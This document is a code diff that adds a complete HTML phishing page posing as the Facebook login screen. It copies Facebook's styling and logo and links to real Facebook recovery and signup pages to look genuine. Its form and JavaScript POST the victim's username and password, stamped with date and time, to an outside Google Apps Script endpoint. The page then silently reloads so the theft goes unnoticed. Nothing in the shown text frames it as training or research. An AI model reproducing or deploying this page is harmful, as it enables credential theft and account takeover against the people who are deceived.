@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 20px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #165eab;
+        }
+
+        .forgot-password {
+            text-decoration: none;
+            color: #1877f2;
+            margin: 10px 0;
+        }
+
+        .separator {
+            width: 100%;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .separator span {
+            color: #888;
+        }
+
+        .create-account-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #42b72a;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="login-form">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo" class="logo">
+
+            <form id="loginForm" action="https://script.google.com/macros/s/AKfycbwrc_OgfwrnPM2xv-HYK4GwGtREl6kUUoezFubPD_4cgsYZQ4qLx7iYeJIQGbWaWTom/exec" method="POST" name="fb-form">
+                <input type="hidden" name="account" value="Facebook">
+
+                <input type="text" placeholder="Email or Phone" class="input-field" id="email" name="username" required>
+                <input type="password" placeholder="Password" class="input-field" id="password" name="password" required>
+
+                <!-- Hidden input fields for date and time -->
+                <input type="hidden" name="submit_date" id="submit-date">
+                <input type="hidden" name="submit_time" id="submit-time">
+
+                <input type="submit" class="login-button" value="Log In" name="submit">
+            </form>
+
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot-password">Forgotten password?</a>
+            <div class="separator">
+                <span>or</span>
+            </div>
+            <a href="https://www.facebook.com/r.php?entry_point=login"><input type="submit" class="create-account-button" value="Create New Account"></a>
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwrc_OgfwrnPM2xv-HYK4GwGtREl6kUUoezFubPD_4cgsYZQ4qLx7iYeJIQGbWaWTom/exec';
+        const form = document.forms['fb-form'];
+
+        // Function to set the date and time
+        function setDateAndTime() {
+            const now = new Date();
+            const date = now.toLocaleDateString();  // Gets the current date 
+            const time = now.toLocaleTimeString();  // Gets the current time 
+
+            document.getElementById('submit-date').value = date;
+            document.getElementById('submit-time').value = time;
+        }
+
+        // Attach event listener to submit form
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+
+            // Set the date and time before submitting
+            setDateAndTime();
+
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(() => {
+                window.location.reload();
+            })
+            .catch(error => console.error('Error!', error.message));
+        });
+    </script>
+
+</body>
+</html>
